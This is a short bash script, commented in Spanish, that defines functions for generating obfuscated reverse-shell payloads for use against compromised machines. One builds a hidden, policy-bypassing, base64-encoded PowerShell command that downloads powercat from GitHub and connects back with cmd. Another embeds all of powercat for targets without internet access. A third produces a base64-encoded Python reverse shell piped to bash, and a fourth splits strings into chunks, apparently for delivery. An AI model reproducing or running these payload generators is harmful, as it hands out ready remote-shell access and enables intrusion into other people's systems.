#!/bin/bash

#
# Reverse shell con powercat en caso de que la maquina comprometidad tenga acceso a internet y pueda descargar powercat
#

reverse-shell-powercat(){
echo -n "powershell -nOp -w hIDdeN -EP ByPaSs -e ";echo "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c $1 -p $2 -e cmd;" | iconv -t UTF-16LE | base64 | tr -d '\n';echo "";
}

#
# Reverse shell para maquinas que no tengan acceso a a internet, en esta metemos todo el codigo de powercat
#

reverse-shell-download-powercat(){
echo -n "powershell -nOp -w hIDdeN -EP ByPaSs -e ";
echo `curl -s https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1` 'powercat -c "$1" -p $2 -e cmd.exe' | iconv -t UTF-16LE | base64 | tr -d "\n"
}

reverse-shell-python(){
REVERSE=$(echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" | base64 | tr -d '\n');

echo "echo '$REVERSE' | base64 --decode | /bin/bash";
}

#
# Sirve para cortar una cadena en chunks de un tamaño especifico
#
chunking_line(){
echo "$1" | sed -r "s/(.{$2})/\1\n/g"
}

